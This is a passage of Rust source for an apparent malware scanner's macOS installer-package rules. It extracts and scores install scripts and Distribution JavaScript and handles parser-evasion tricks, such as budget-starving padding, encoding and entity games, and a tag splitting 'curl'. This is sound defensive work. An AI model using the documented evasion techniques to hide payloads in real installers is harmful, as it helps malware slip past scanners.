//! Installer-package (`.pkg`) heuristics (§5.2, §6.1). Two rules, kept in
//! different categories so a package that is both unsigned *and* fetches remote
//! code corroborates across §5.1's two-category requirement:
//!
//! - `installer-script-suspicious` (`StaticSuspicion`) scores the install
//!   scripts' contents and the JavaScript in the `Distribution` file;
//! - `unsigned-installer-package` (`ProvenanceConcern`) notes a missing signature.
//!
//! The script rule mostly buys reach: it extracts the script text (xar TOC →
//! heap → gzip → cpio, or `Distribution` XML) and hands the bytes to the
//! existing content rules. The one heuristic of its own is a narrow marker for
//! a `Distribution` that launches an interpreter. Only the named metadata
//! entries are read; `Payload` is left for §6.2's Phase 0b path.

use super::container::unread_container_reasons;
use super::zip_member::{inspection_with, ZipInspection};
use super::{embedded_content_ruleset, Rule, RuleOutcome, UninspectedContainerRule, ZipMemberRule};
use crate::context::ScanContext;
use crate::model::{MatchedSignal, SignalCategory};
use crate::scan::{scan_context, scan_embedded_bytes};
use crate::source::ByteSource;
use crate::zip::ZipLimits;
use crate::{cpio, xar, xml};
use std::collections::{HashMap, HashSet};

/// Ceiling on what the script rule can contribute — the sub-scan total climbs
/// fast when several markers match, and Phase 0a scoring is a plain sum (§12).
const MAX_SCRIPT_WEIGHT: i32 = 20;

/// Weight for a Distribution that launches an interpreter via `system.run`.
/// Corroboration only: below Notify on its own (§5.1).
const DISTRIBUTION_INTERPRETER_WEIGHT: i32 = 8;

/// Weight for `Scripts` that Installer runs overrunning the read-back budget:
/// cut by their share before the cpio trailer, or holding a script longer
/// than the per-member scan cap (§5.2, §6.2).
/// Corroboration only: below Notify alone; with `unsigned-installer-package`
/// it reaches Notify across two categories (§5.1).
const INSTALLER_SCRIPTS_STARVED_WEIGHT: i32 = 10;

/// Weight for a package with no signature. Well below the notify threshold:
/// plenty of legitimate packages are unsigned (all default `pkgbuild` output).
/// Earns its place by corroborating (§5.1, §5.4).
const UNSIGNED_PACKAGE_WEIGHT: i32 = 6;

/// Scores a package's install scripts and `Distribution` JavaScript.
pub struct InstallerScriptRule;

impl Rule for InstallerScriptRule {
    fn id(&self) -> &'static str {
        "installer-script-suspicious"
    }

    fn category(&self) -> SignalCategory {
        SignalCategory::StaticSuspicion
    }

    fn evaluate(&self, ctx: &ScanContext) -> Result<Option<MatchedSignal>, RuleOutcome> {
        self.evaluate_with(ctx, &xar::XarLimits::default())
    }

    /// A truncated prefix that isn't even a xar archive has no scripts this
    /// rule could have missed past the cap.
    fn covers_truncation(&self, ctx: &ScanContext) -> bool {
        ctx.content
            .as_deref()
            .is_some_and(|c| !xar::has_xar_magic(c))
    }
}

impl InstallerScriptRule {
    /// [`Rule::evaluate`] under the given xar `limits`.
    fn evaluate_with(
        &self,
        ctx: &ScanContext,
        limits: &xar::XarLimits,
    ) -> Result<Option<MatchedSignal>, RuleOutcome> {
        self.evaluate_limited(ctx, limits, &mut ZipAllowance::new(&ZipLimits::default()))
    }

    /// [`Rule::evaluate`] under xar `limits`, every ZIP among `Scripts`
    /// members read from `zips`.
    fn evaluate_limited(
        &self,
        ctx: &ScanContext,
        limits: &xar::XarLimits,
        zips: &mut ZipAllowance,
    ) -> Result<Option<MatchedSignal>, RuleOutcome> {
        let content = ctx.content.as_ref().ok_or(RuleOutcome::NotApplicable)?;

        let Some(archive) = xar::parse(content, limits) else {
            return Ok(None); // not a package
        };
        // Couldn't read in full => "couldn't check", never "clean" (§10, §11.8).
        if !archive.is_complete() {
            return Err(RuleOutcome::NotApplicable);
        }

        let mut unreadable = false;
        let mut budget = xar::ReadBudget::new(limits);

        let mut entries = Vec::new();
        let wanted = archive
            .metadata_entries()
            .filter(|e| matches!(e.name.as_str(), "Scripts" | "Distribution"));
        for (toc_index, entry) in wanted.enumerate() {
            // `Scripts` holds a nested gzip: sorted and read as one.
            let nested = entry.name == "Scripts";
            // Read through `ctx`, past `content` if need be (§6.2).
            let cost = budget.entry_allowance(ctx, &archive, entry, nested).ok();
            unreadable |= cost.is_none();
            entries.push(Wanted {
                toc_index,
                entry,
                nested,
                cost,
            });
        }

        let is_file = |w: &Wanted| w.entry.kind != xar::XarKind::Directory;
        // First `Scripts` in TOC order for each path, as Installer resolves it.
        let mut scripts_by_path: HashMap<&str, usize> = HashMap::new();
        for (i, w) in entries.iter().enumerate() {
            if w.entry.name == "Scripts" && is_file(w) {
                scripts_by_path.entry(w.entry.path.as_str()).or_insert(i);
            }
        }
        let readable_scripts = entries
            .iter()
            .filter(|w| w.entry.name == "Scripts" && w.cost.is_some())
            .count();

        let mut taken = vec![false; entries.len()];
        let mut seen = HashSet::new();
        let mut found_by_entry: Vec<(usize, ScriptFindings)> = Vec::new();

        // The entries Installer runs go first, so padding elsewhere cannot
        // shrink their allowance (§5.2).
        let mut installer_scripts = Vec::new();
        let mut refs_trusted = false;
        let first_dist = entries
            .iter()
            .position(|w| w.entry.name == "Distribution" && w.entry.depth == 0 && is_file(w));
        if let Some(d) = first_dist {
            taken[d] = true;
            let dist = &entries[d];
            if dist.cost.is_some() {
                seen.insert(range_key(dist.entry));
                // Its pkg-refs name Scripts that still need a share.
                budget.start_share(if readable_scripts > 0 { 2 } else { 1 });
                let mut found = ScriptFindings::default();
                let resolve = |path: &str| {
                    scripts_by_path
                        .get(format!("{path}/Scripts").as_str())
                        .copied()
                        .filter(|j| entries[*j].cost.is_some())
                };
                let query = RefQuery {
                    max: readable_scripts,
                    resolve: &resolve,
                };
                match scan_distribution_entry(
                    ctx,
                    &archive,
                    dist.entry,
                    &mut budget,
                    &mut found,
                    Some(&query),
                ) {
                    Ok(Some(refs)) => {
                        refs_trusted = true;
                        for j in refs {
                            if !taken[j] {
                                taken[j] = true;
                                installer_scripts.push(j);
                            }
                        }
                    }
                    Ok(None) => {}
                    Err(_) => unreadable = true,
                }
                found_by_entry.push((dist.toc_index, found));
            }
        } else if let Some(j) = entries
            .iter()
            .position(|w| w.entry.name == "Scripts" && w.entry.depth == 0 && is_file(w))
        {
            taken[j] = true;
            installer_scripts.push(j);
        }

        let rest: Vec<usize> = (0..entries.len()).filter(|i| !taken[*i]).collect();
        let mut starved = false;
        // Without a trusted reference set, Installer may run any `Scripts`.
        let rest_runs = first_dist.is_some() && !refs_trusted;
        for (runs, group) in [(true, installer_scripts), (rest_runs, rest)] {
            // Cheapest to read first: small real entries are read in full
            // before large or padded ones, and their unused allowance carries
            // forward. Ties go to the shallower, then the earlier TOC entry. An
            // entry that cannot be read at all takes no share, and a repeat of
            // an already-read heap range takes none either.
            let mut work: Vec<usize> = group
                .into_iter()
                .filter(|i| entries[*i].cost.is_some())
                .collect();
            work.sort_by_key(|i| (entries[*i].cost, entries[*i].entry.depth, *i));
            work.retain(|i| seen.insert(range_key(entries[*i].entry)));

            let total = work.len();
            let scripts = work.iter().filter(|i| entries[**i].nested).count();
            for (rank, i) in work.into_iter().enumerate() {
                budget.start_entry(total - rank);
                let mut found = ScriptFindings::default();
                let result = if entries[i].nested {
                    let (result, overrun) = scan_scripts_entry(
                        ctx,
                        &archive,
                        entries[i].entry,
                        &mut budget,
                        limits.max_entry_bytes,
                        zips,
                        &mut found,
                    );
                    // Reported once per package (§5.2, #112, #123).
                    if runs && overrun && !starved {
                        starved = true;
                        let s = if scripts == 1 { "" } else { "s" };
                        found.add(
                            INSTALLER_SCRIPTS_STARVED_WEIGHT,
                            format!(
                                "scripts Installer runs exceed the read budget ({scripts} component{s})"
                            ),
                        );
                    }
                    result
                } else {
                    scan_distribution_entry(
                        ctx,
                        &archive,
                        entries[i].entry,
                        &mut budget,
                        &mut found,
                        None,
                    )
                    .map(|_| ())
                };
                unreadable |= result.is_err();
                found_by_entry.push((entries[i].toc_index, found));
            }
        }

        // Merged in TOC order, so the report does not depend on read order.
        found_by_entry.sort_by_key(|(toc_index, _)| *toc_index);
        let mut findings = ScriptFindings::default();
        for (_, found) in found_by_entry {
            findings.absorb(found);
        }

        // Nothing scored: clean only if every entry was actually read.
        if findings.descriptions.is_empty() || findings.total <= 0 {
            return if unreadable {
                Err(RuleOutcome::NotApplicable)
            } else {
                Ok(None)
            };
        }
        // A finding outranks the gap, but the gap is still reported (§11.8).
        if unreadable {
            ctx.mark_incomplete(self.id());
        }

        Ok(Some(MatchedSignal {
            id: self.id().to_string(),
            weight: findings.total.min(MAX_SCRIPT_WEIGHT),
            description: findings.descriptions.join("; "),
            category: self.category(),
        }))
    }
}

/// A `Scripts` or `Distribution` TOC entry; `nested` if it is read with
/// `read_entry_nested`, and `cost` is the allowance needed to read its input
/// in full (`xar::entry_allowance`), `None` if unreadable.
struct Wanted<'a> {
    toc_index: usize,
    entry: &'a xar::XarFile,
    nested: bool,
    cost: Option<usize>,
}

/// Identity of an entry's heap bytes: entries sharing one are read once.
fn range_key(entry: &xar::XarFile) -> (bool, Option<u64>, Option<u64>) {
    (entry.name == "Scripts", entry.offset, entry.length)
}

/// Signal descriptions and summed weight collected across scanned script text.
#[derive(Default)]
struct ScriptFindings {
    descriptions: Vec<String>,
    total: i32,
}

impl ScriptFindings {
    /// Scans `bytes` with the embedded-content rules; each signal is recorded
    /// as `"{prefix}: {description}"`. `truncated` if `bytes` is a prefix.
    fn scan(&mut self, label: String, bytes: Vec<u8>, prefix: &str, truncated: bool) {
        let result = scan_embedded_bytes(label, bytes, truncated, &embedded_content_ruleset());
        self.record(prefix, &result.signals);
    }

    /// Records each signal as `"{prefix}: {description}"`.
    fn record(&mut self, prefix: &str, signals: &[MatchedSignal]) {
        for signal in signals {
            self.total = self.total.saturating_add(signal.weight);
            self.descriptions
                .push(format!("{prefix}: {}", signal.description));
        }
    }

    /// Records a finding that did not come from a content-rule signal.
    fn add(&mut self, weight: i32, description: String) {
        self.total = self.total.saturating_add(weight);
        self.descriptions.push(description);
    }

    /// Appends `other`'s findings after these.
    fn absorb(&mut self, other: ScriptFindings) {
        self.total = self.total.saturating_add(other.total);
        self.descriptions.extend(other.descriptions);
    }
}

/// Reads the `Scripts` entry (gzip-wrapped cpio), scanning each regular member
/// as it is decoded; a ZIP member is read from `zips`. Returns `NotApplicable`
/// if any step can't be read in full, and whether the entry overran a limit
/// Installer's scripts never come near: its share (unless its input alone is
/// over a lone entry's) or a size cap stopped it before the cpio trailer, the
/// walk hit the member-count or name limit, or a script is longer than
/// `max_member_bytes` (§5.2, #123).
fn scan_scripts_entry(
    ctx: &ScanContext,
    archive: &xar::XarArchive,
    entry: &xar::XarFile,
    budget: &mut xar::ReadBudget,
    max_member_bytes: usize,
    zips: &mut ZipAllowance,
    findings: &mut ScriptFindings,
) -> (Result<(), RuleOutcome>, bool) {
    let total = max_member_bytes.saturating_mul(SCANNED_ENTRY_MULTIPLE);
    let mut sink = ScriptsSink {
        label: format!("{}!{}", ctx.path.display(), entry.path),
        scan_left: total,
        later_scan_left: total,
        zips,
        first: ScriptsPart::new(max_member_bytes, ""),
        later: vec![ScriptsPart::new(max_member_bytes, LATER_MEMBER_NOTE)],
    };
    // An entry we can't reach (bounded read stopped short) is unreadable, not
    // absent. A partial read is scanned, then reported unreadable below.
    let read = budget.read_entry_nested(ctx, archive, entry, &mut sink);
    // Hiding a script behind input alone takes a stream of over half a lone
    // entry's input share (64 MiB gzip, ~43 MiB zlib), and real installers
    // can carry big Scripts (§5.2).
    let cut = (budget.last_cut_by_share() && !budget.last_input_over_share())
        || budget.last_cut_at_limit();
    let Ok(read) = read else {
        return (Err(RuleOutcome::NotApplicable), cut);
    };
    let ScriptsSink {
        label,
        mut scan_left,
        mut later_scan_left,
        zips,
        first,
        later,
    } = sink;

    // A nested gzip's input past where it stopped (stored-block text past a
    // limit) is scanned raw.
    if !read.unread.is_empty() {
        let unread = read.unread;
        findings.scan(
            label.clone(),
            unread,
            "install scripts (unparsed)",
            read.unread_cut,
        );
    }
    let first = first.finish(
        &label,
        "install scripts (unparsed)",
        read.gap.is_some(),
        &mut scan_left,
        zips,
    );
    findings.absorb(first.findings);
    // Installer never runs later members (#109): nothing there makes the
    // entry unreadable.
    for part in later {
        let later = part.finish(
            &label,
            "install scripts (later gzip member, unparsed)",
            false,
            &mut later_scan_left,
            zips,
        );
        findings.absorb(later.findings);
    }

    let script_over_cap = first.script_over_cap || (first.script_alias && first.over_cap);
    let overrun = (cut && !first.trailer) || first.limit_halt || script_over_cap;
    // A later member's nested gap is not one, like the rest of them (#109).
    let complete = first.trailer
        && !first.over_cap
        && !first.skipped
        && !first.nested_gap
        && read.gap.is_none();
    let result = if complete {
        Ok(())
    } else {
        Err(RuleOutcome::NotApplicable)
    };
    (result, overrun)
}

/// Names of the scripts Installer runs from the top of a component's `Scripts`.
const INSTALL_SCRIPT_NAMES: [&str; 6] = [
    "preinstall",
    "postinstall",
    "preflight",
    "postflight",
    "preupgrade",
    "postupgrade",
];

/// Whether a cpio member name is one of [`INSTALL_SCRIPT_NAMES`] at the top
/// level: cut at the first NUL, leading `./` removed, case-folded as APFS
/// folds it.
fn is_install_script(name: &str) -> bool {
    let mut name = name.split('\0').next().unwrap_or_default();
    while let Some(rest) = name.strip_prefix("./") {
        name = rest;
    }
    // U+017F (long s) is the one non-ASCII code point that folds to a letter
    // of these names.
    let folded: String = name
        .chars()
        .map(|c| match c {
            '\u{17F}' => 's',
            c => c.to_ascii_lowercase(),
        })
        .collect();
    INSTALL_SCRIPT_NAMES.contains(&folded.as_str())
}

/// How many times the per-member cap the content rules scan across one
/// `Scripts` entry's members other than install scripts (§5.2, #123).
const SCANNED_ENTRY_MULTIPLE: usize = 4;

/// Description note for a script found in a `Scripts` gzip member after the
/// first, which Installer does not extract.
const LATER_MEMBER_NOTE: &str = " (later gzip member, not run by Installer)";

/// A [`xar::NestedSink`] that walks a `Scripts` entry's first member and its
/// later members as cpio, scanning members as they complete.
struct ScriptsSink<'z> {
    /// `{file}!{entry path}`.
    label: String,
    /// Bytes still to scan of the first member's members other than install
    /// scripts.
    scan_left: usize,
    /// The same for later members, all sources together.
    later_scan_left: usize,
    zips: &'z mut ZipAllowance,
    first: ScriptsPart,
    /// One walk per source of later members; the last is current.
    later: Vec<ScriptsPart>,
}

impl xar::NestedSink for ScriptsSink<'_> {
    fn first(&mut self, bytes: &[u8]) {
        self.first
            .push(&self.label, bytes, &mut self.scan_left, self.zips);
    }

    fn later(&mut self, bytes: &[u8]) {
        if let Some(part) = self.later.last_mut() {
            part.push(&self.label, bytes, &mut self.later_scan_left, self.zips);
        }
    }

    fn later_from_entry(&mut self) {
        let cap = self.first.max_member_bytes;
        self.later.push(ScriptsPart::new(cap, LATER_MEMBER_NOTE));
    }
}

/// One cpio stream of a `Scripts` entry and what scanning it found.
struct ScriptsPart {
    walk: cpio::CpioStream,
    max_member_bytes: usize,
    scanned: ScriptsScanned,
}

/// What scanning a [`ScriptsPart`]'s members found.
#[derive(Default)]
struct ScriptsScanned {
    /// Appended to each member's description.
    note: &'static str,
    findings: ScriptFindings,
    /// The walk reached the cpio trailer (set by [`ScriptsPart::finish`]).
    trailer: bool,
    /// The walk halted at its member-count or name limit.
    limit_halt: bool,
    /// A regular member was longer than the scan cap.
    over_cap: bool,
    /// One of those was named as an install script.
    script_over_cap: bool,
    /// An install script name is a link or other non-regular member, or
    /// empty: any over-cap member may be what it runs.
    script_alias: bool,
    /// A member's body was not scanned: past the entry's scan total.
    skipped: bool,
    /// A member, or bytes scanned raw, is a disk image, an installer package
    /// or a ZIP not read in full, or the container rule could not tell
    /// (§6.2, §11.8).
    nested_gap: bool,
}

impl ScriptsPart {
    fn new(max_member_bytes: usize, note: &'static str) -> Self {
        ScriptsPart {
            walk: cpio::CpioStream::new(cpio::StreamLimits {
                max_entries: cpio::CpioLimits::default().max_entries,
                max_member_bytes,
            }),
            max_member_bytes,
            scanned: ScriptsScanned {
                note,
                ..ScriptsScanned::default()
            },
        }
    }

    fn push(&mut self, label: &str, bytes: &[u8], scan_left: &mut usize, zips: &mut ZipAllowance) {
        let members = self.walk.push(bytes);
        self.scanned.scan_members(label, members, scan_left, zips);
    }

    /// Ends the walk: scans what is left (bytes that are not cpio are scanned
    /// raw as `unparsed`, a member cut off mid-body as far as it goes).
    /// `gap` if the bytes walked stop short of the stream's end.
    fn finish(
        self,
        label: &str,
        unparsed: &str,
        gap: bool,
        scan_left: &mut usize,
        zips: &mut ZipAllowance,
    ) -> ScriptsScanned {
        let mut scanned = self.scanned;
        let (members, end) = self.walk.finish();
        scanned.scan_members(label, members, scan_left, zips);
        match end {
            cpio::StreamEnd::NotCpio { raw, more } => {
                if !raw.is_empty() {
                    let cut = more || gap;
                    scanned.scan_member(label.to_string(), raw, unparsed, cut, zips);
                }
            }
            cpio::StreamEnd::Archive { halted, cut_short } => {
                let cut_short = cut_short.into_iter().collect();
                scanned.scan_members(label, cut_short, scan_left, zips);
                scanned.trailer = halted.is_none();
                scanned.limit_halt = matches!(
                    halted,
                    Some(cpio::CpioHalt::EntryLimit | cpio::CpioHalt::ByteLimit)
                );
            }
        }
        scanned
    }
}

impl ScriptsScanned {
    /// Scans each non-empty regular member (file type 0 included) and any
    /// non-empty install script, labelled `install script {name}{note}`, plus
    /// ` (cut short)` if only part of its body was read. Members that are not
    /// install scripts are scanned only while `scan_left` lasts.
    fn scan_members(
        &mut self,
        label: &str,
        members: Vec<cpio::StreamedMember>,
        scan_left: &mut usize,
        zips: &mut ZipAllowance,
    ) {
        for member in members {
            let script = is_install_script(&member.name);
            // An unknown type is extracted as a regular file.
            let regular = member.is_regular_file() || member.mode & 0o170000 == 0;
            if !regular || member.data.is_empty() {
                self.script_alias |= script;
            }
            if !regular && !script {
                continue;
            }
            if member.end == cpio::MemberEnd::OverCap {
                self.over_cap = true;
                self.script_over_cap |= script;
            }
            if member.data.is_empty() {
                continue;
            }
            let len = member.data.len();
            if script {
                *scan_left = scan_left.saturating_sub(len);
            } else if len > *scan_left {
                self.skipped = true;
                continue;
            } else {
                *scan_left -= len;
            }
            let cut_note = match member.end {
                cpio::MemberEnd::Whole => "",
                cpio::MemberEnd::OverCap | cpio::MemberEnd::CutShort => " (cut short)",
            };
            self.scan_member(
                format!("{label}/{}", member.name),
                member.data,
                &format!("install script {}{}{cut_note}", member.name, self.note),
                member.end != cpio::MemberEnd::Whole,
                zips,
            );
        }
    }

    /// Scans `bytes` as [`ScriptFindings::scan`] does, except that a ZIP is
    /// read from `zips` and scored through its members alone, as a standalone
    /// zip's are. Sets `nested_gap` for what could not be read (§6.2).
    fn scan_member(
        &mut self,
        label: String,
        bytes: Vec<u8>,
        prefix: &str,
        truncated: bool,
        zips: &mut ZipAllowance,
    ) {
        let ctx = ScanContext::from_embedded_bytes(label, bytes, truncated);
        self.nested_gap |= !unread_container_reasons(&ctx).is_empty();
        let read = zips.inspect(&ctx).is_some();
        if read {
            // Unsigned members stay unscored, as a bare Mach-O member is.
            let signal = ZipMemberRule.evaluate(&ctx).ok().flatten();
            self.findings.record(prefix, signal.as_slice());
        }
        // Text before a prefixed zip (a self-extracting script) is scanned too.
        let starts_as_zip = ctx
            .content
            .as_deref()
            .is_some_and(|c| c.starts_with(b"PK\x03\x04"));
        if !read || !starts_as_zip {
            let signals = scan_context(&ctx, &embedded_content_ruleset()).signals;
            self.findings.record(prefix, &signals);
        }
        // Reads the zip cached by `zips.inspect`, never again.
        self.nested_gap |= !matches!(UninspectedContainerRule.evaluate(&ctx), Ok(None));
    }
}

/// The ZIP read budget of one package scan. Every ZIP among its `Scripts`
/// members is read from what is left, so together they spend at most one
/// standalone zip's `max_read_back_bytes`; one read once it is gone is a gap
/// (§6.2, §11.12).
struct ZipAllowance {
    limits: ZipLimits,
    left: usize,
}

impl ZipAllowance {
    fn new(limits: &ZipLimits) -> Self {
        ZipAllowance {
            limits: *limits,
            left: limits.max_read_back_bytes,
        }
    }

    /// Reads `ctx` as a zip under what is left and charges what it spent.
    /// `None` if it is not one that is read. Call before any zip rule
    /// evaluates `ctx`, so they use this read.
    fn inspect<'c>(&mut self, ctx: &'c ScanContext) -> Option<&'c ZipInspection> {
        // Already read: charged then.
        if let Some(read) = ctx.zip_cache.get() {
            return read.as_ref();
        }
        let limits = ZipLimits {
            max_read_back_bytes: self.left,
            ..self.limits
        };
        let read = inspection_with(ctx, &limits)?;
        self.left = self.left.saturating_sub(read.spent);
        Some(read)
    }
}

/// Extracts the installer JavaScript from `Distribution` XML: `<script>`
/// bodies as an XML parser would deliver them (see [`script_body_texts`]) and
/// every attribute value (entity-decoded), joined with `\n`. Over-inclusive on
/// purpose: any attribute can carry an expression. Empty if there is none.
/// `NotApplicable` on malformed XML, an unterminated `<script>`, or any
/// document we could not read the way Installer's parser would (see
/// [`check_faithfully_readable`], §11.8).
#[cfg(test)]
fn distribution_js(raw: &[u8]) -> Result<Vec<u8>, RuleOutcome> {
    let decoded = utf16_to_utf8(raw);
    let mut pieces = Vec::new();
    distribution_pieces(
        decoded.as_deref().unwrap_or(raw),
        decoded.is_some(),
        &mut pieces,
    )?;
    Ok(join_pieces(&pieces))
}

/// Non-blank `pieces` joined with `\n`.
fn join_pieces(pieces: &[String]) -> Vec<u8> {
    let kept: Vec<&str> = pieces
        .iter()
        .map(String::as_str)
        .filter(|p| !p.trim().is_empty())
        .collect();
    kept.join("\n").into_bytes()
}

/// The walker behind [`distribution_js`], over UTF-8 or 8-bit bytes;
/// `transcoded` says they came out of [`utf16_to_utf8`]. Pieces collected
/// before a failure stay in `pieces`; an unterminated `<script>` contributes
/// its body so far.
fn distribution_pieces(
    xml_bytes: &[u8],
    transcoded: bool,
    pieces: &mut Vec<String>,
) -> Result<(), RuleOutcome> {
    check_faithfully_readable(xml_bytes, transcoded)?;
    let mut saw_element = false;
    let mut scanner = xml::Scanner::new(xml_bytes);
    loop {
        match scanner.next_event() {
            xml::Next::End => break,
            xml::Next::Bad => return Err(RuleOutcome::NotApplicable),
            xml::Next::Event(xml::Event::Open {
                name,
                attrs,
                self_closing,
            }) => {
                saw_element = true;
                for (_, value) in xml::attrs(attrs) {
                    pieces.push(xml::decode_entities(value));
                    check_entities(value)?;
                }
                if name == "script" && !self_closing {
                    let Some(raw) = scanner.raw_until_close("script") else {
                        if let Ok(body) = script_body_texts(scanner.rest()) {
                            pieces.extend(body);
                        }
                        return Err(RuleOutcome::NotApplicable);
                    };
                    pieces.extend(script_body_texts(raw)?);
                }
            }
            xml::Next::Event(_) => {}
        }
    }
    if !saw_element {
        return Err(RuleOutcome::NotApplicable);
    }
    Ok(())
}

/// Transcodes UTF-16 (BOM, or BOM-less starting `<\0` / `\0<`) to UTF-8
/// bytes; `None` if `b` doesn't look like UTF-16. A trailing odd byte is dropped.
fn utf16_to_utf8(b: &[u8]) -> Option<Vec<u8>> {
    let (big_endian, body) = match b {
        [0xFF, 0xFE, rest @ ..] => (false, rest),
        [0xFE, 0xFF, rest @ ..] => (true, rest),
        [b'<', 0, ..] => (false, b),
        [0, b'<', ..] => (true, b),
        _ => return None,
    };
    let units: Vec<u16> = xml::utf16_units(body, big_endian).collect();
    Some(String::from_utf16_lossy(&units).into_bytes())
}

/// The text(s) a `<script>` body yields: CDATA verbatim, comments and
/// processing instructions dropped, the rest entity-decoded (a raw `<` that
/// starts none of those stays literal, as in `a < b`). A second variant with
/// tag-shaped runs removed is added when it differs, covering child elements
/// that split a token (`cu<b/>rl`).
fn script_body_texts(raw: &[u8]) -> Result<Vec<String>, RuleOutcome> {
    let mut with_tags = String::new();
    let mut without_tags = String::new();
    let (mut seg_start, mut from) = (0usize, 0usize);
    while let Some(off) = raw.get(from..).and_then(|r| xml::find(r, b"<")) {
        let at = from.saturating_add(off);
        let here = raw.get(at..).unwrap_or(&[]);
        let markup: Option<(usize, &[u8])> = if here.starts_with(b"<![CDATA[") {
            Some((9, b"]]>"))
        } else if here.starts_with(b"<!--") {
            Some((4, b"-->"))
        } else if here.starts_with(b"<?") {
            Some((2, b"?>"))
        } else {
            None
        };
        let Some((open_len, closer)) = markup else {
            from = at.saturating_add(1);
            continue;
        };
        let seg = raw.get(seg_start..at).unwrap_or(&[]);
        check_entities(seg)?;
        flush_segment(seg, &mut with_tags, &mut without_tags);
        let body_start = at.saturating_add(open_len);
        let body = raw.get(body_start..).unwrap_or(&[]);
        let (inner, after) = match xml::find(body, closer) {
            Some(i) => (
                body.get(..i).unwrap_or(&[]),
                body_start.saturating_add(i).saturating_add(closer.len()),
            ),
            None => (body, raw.len()),
        };
        if open_len == 9 {
            let text = String::from_utf8_lossy(inner);
            with_tags.push_str(&text);
            without_tags.push_str(&text);
        }
        seg_start = after;
        from = after;
    }
    let seg = raw.get(seg_start..).unwrap_or(&[]);
    check_entities(seg)?;
    flush_segment(seg, &mut with_tags, &mut without_tags);
    let mut out = vec![with_tags.clone()];
    if without_tags != with_tags {
        out.push(without_tags);
    }
    Ok(out)
}

/// `NotApplicable` unless the document would be read by Installer's parser as
/// the characters we are scanning: it must start with `<` (after an optional
/// UTF-8 BOM and whitespace), declare no unsupported `encoding`, and declare
/// no entities. `transcoded` says `b` came out of [`utf16_to_utf8`]: a UTF-16
/// label is accepted only then, and an 8-bit document must contain no NUL.
fn check_faithfully_readable(b: &[u8], transcoded: bool) -> Result<(), RuleOutcome> {
    if !transcoded && b.contains(&0) {
        return Err(RuleOutcome::NotApplicable);
    }
    let b = b.strip_prefix(b"\xEF\xBB\xBF".as_slice()).unwrap_or(b);
    let start = b
        .iter()
        .position(|c| !c.is_ascii_whitespace())
        .unwrap_or(b.len());
    let head = b.get(start..).unwrap_or(&[]);
    if head.first() != Some(&b'<') {
        return Err(RuleOutcome::NotApplicable);
    }
    if head.starts_with(b"<?xml") {
        let decl_end = xml::find(head, b"?>").unwrap_or(head.len());
        let decl = head.get(..decl_end).unwrap_or(&[]);
        if let Some(i) = xml::find(decl, b"encoding") {
            let after = decl.get(i + "encoding".len()..).unwrap_or(&[]);
            let value = after
                .iter()
                .position(|c| *c == b'"' || *c == b'\'')
                .and_then(|q| {
                    let rest = after.get(q + 1..)?;
                    let end = rest.iter().position(|c| Some(c) == after.get(q))?;
                    rest.get(..end)
                })
                .map(|v| String::from_utf8_lossy(v).to_ascii_lowercase());
            let ok = value.as_deref().is_some_and(|v| {
                matches!(
                    v,
                    "utf-8" | "utf8" | "us-ascii" | "ascii" | "iso-8859-1" | "latin-1" | "latin1"
                ) || (transcoded && matches!(v, "utf-16" | "utf-16le" | "utf-16be"))
            });
            if !ok {
                return Err(RuleOutcome::NotApplicable);
            }
        }
    }
    if xml::find(b, b"<!ENTITY").is_some() {
        return Err(RuleOutcome::NotApplicable);
    }
    Ok(())
}

/// `NotApplicable` if `text` has a named entity reference other than the five
/// predefined ones: a DTD could define it to be anything.
fn check_entities(text: &[u8]) -> Result<(), RuleOutcome> {
    let mut from = 0usize;
    while let Some(off) = text.get(from..).and_then(|r| xml::find(r, b"&")) {
        let at = from.saturating_add(off).saturating_add(1);
        from = at;
        let window = text.get(at..).unwrap_or(&[]);
        let window = window
            .get(..window.len().min(xml::MAX_ENTITY_BODY + 1))
            .unwrap_or(&[]);
        let Some(semi) = window.iter().position(|c| *c == b';') else {
            continue;
        };
        let body = window.get(..semi).unwrap_or(&[]);
        let is_name = !body.is_empty()
            && body
                .iter()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, b'_' | b'.' | b':' | b'-'));
        let known = matches!(body, b"lt" | b"gt" | b"amp" | b"quot" | b"apos");
        if is_name && !known {
            return Err(RuleOutcome::NotApplicable);
        }
    }
    Ok(())
}

/// Appends the entity-decoded `seg` to the with-tags text, and the same with
/// tag-shaped runs removed to the other.
fn flush_segment(seg: &[u8], with_tags: &mut String, without_tags: &mut String) {
    with_tags.push_str(&xml::decode_entities(seg));
    without_tags.push_str(&xml::decode_entities(&strip_tags(seg)));
}

/// Removes tag-shaped runs (`<` + letter or `/`, through the next `>`).
fn strip_tags(seg: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(seg.len());
    let mut i = 0usize;
    let mut no_more_gt = false;
    while let Some(&c) = seg.get(i) {
        let tag_like = c == b'<'
            && !no_more_gt
            && seg
                .get(i + 1)
                .is_some_and(|n| n.is_ascii_alphabetic() || *n == b'/');
        if tag_like {
            match seg.get(i..).and_then(|r| xml::find(r, b">")) {
                Some(g) => {
                    i = i.saturating_add(g).saturating_add(1);
                    continue;
                }
                None => no_more_gt = true,
            }
        }
        out.push(c);
        i += 1;
    }
    out
}

/// Which `pkg-ref` paths to collect: at most `max`, each one `resolve` maps
/// to a `Scripts` entry index; see [`pkg_ref_paths`].
struct RefQuery<'a> {
    max: usize,
    resolve: &'a dyn Fn(&str) -> Option<usize>,
}

/// Reads the `Distribution` entry and scans its JavaScript. With a `refs`
/// query and a full, clean read, returns the entries Installer can run
/// (possibly none), or `None` if any reference is ambiguous (see
/// [`pkg_ref_paths`]). Errors with
/// `NotApplicable` if it can't be read or parsed in full.
fn scan_distribution_entry(
    ctx: &ScanContext,
    archive: &xar::XarArchive,
    entry: &xar::XarFile,
    budget: &mut xar::ReadBudget,
    findings: &mut ScriptFindings,
    refs: Option<&RefQuery>,
) -> Result<Option<Vec<usize>>, RuleOutcome> {
    let (raw, gap) = budget
        .read_entry_partial(ctx, archive, entry)
        .map_err(|_| RuleOutcome::NotApplicable)?;
    // The `.js` suffix makes `classify_text` treat even a short buffer as script.
    let label = format!("{}!{}.js", ctx.path.display(), entry.path);
    let decoded = utf16_to_utf8(&raw);
    let text = decoded.as_deref().unwrap_or(&raw);
    let mut pieces = Vec::new();
    match distribution_pieces(text, decoded.is_some(), &mut pieces) {
        Ok(()) => {
            scan_distribution_text(label, join_pieces(&pieces), findings);
            // A partial read is evidence, not a clean read: findings stay,
            // the entry is reported unreadable.
            if gap.is_some() {
                return Err(RuleOutcome::NotApplicable);
            }
            Ok(refs.and_then(|q| pkg_ref_paths(text, q)))
        }
        Err(_) => {
